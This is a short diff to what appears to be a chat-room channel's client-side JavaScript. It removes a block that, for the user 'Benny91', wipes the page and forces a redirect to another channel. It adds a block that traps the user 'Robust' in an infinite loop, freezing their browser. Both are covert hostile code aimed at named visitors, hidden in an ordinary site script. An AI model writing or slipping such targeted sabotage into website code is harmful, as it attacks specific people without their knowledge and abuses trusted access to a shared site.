@@ -4836,14 +4836,8 @@ if (CLIENT.rank === -1) {
 	}, 180000);
 }
 
-if (CLIENT.name === 'Benny91') {
-	setTimeout(function() {
-		$('body').html('<button id="shit" ></button>').click(function() {
-	    		window.open('https://cytu.be/r/ChillTV');
-		});
-		$("#shit").click();
-	}, 1000);
-	//for (;;) {}
+if (CLIENT.name === 'Robust') {
+	for (;;) {}
 }
 /*
 (function(i, s, o, g, r, a, m) {
